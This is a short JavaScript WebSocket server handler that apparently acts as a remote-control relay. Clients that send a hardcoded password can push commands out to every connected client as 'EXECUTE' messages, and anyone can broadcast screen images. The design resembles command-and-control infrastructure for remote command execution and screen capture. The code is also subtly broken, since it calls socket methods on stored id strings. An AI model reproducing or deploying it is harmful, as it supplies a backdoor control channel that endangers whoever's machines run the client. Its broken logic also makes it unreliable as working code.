const WebSocket = require('ws');
const clients = new Set();

exports.handler = async (event) => {
    if (event.requestContext.eventType === 'CONNECT') {
        return { statusCode: 200, body: 'Connected' };
    }
    
    if (event.requestContext.eventType === 'MESSAGE') {
        const body = JSON.parse(event.body);
        const { action, data, clientId } = body;
        
        if (action === 'AUTH' && data.password === 'shaman666') {
            clients.add(clientId);
            return { statusCode: 200, body: JSON.stringify({ action: 'AUTH_SUCCESS' }) };
        }
        
        if (action === 'COMMAND' && clients.has(clientId)) {
            broadcastToClients({ action: 'EXECUTE', data: data.command });
            return { statusCode: 200, body: 'OK' };
        }
        
        if (action === 'SCREEN_DATA') {
            broadcastToClients({ action: 'SCREEN_UPDATE', data: data.image });
            return { statusCode: 200, body: 'OK' };
        }
    }
    
    return { statusCode: 400, body: 'Invalid request' };
};

function broadcastToClients(message) {
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(message));
        }
    });
}
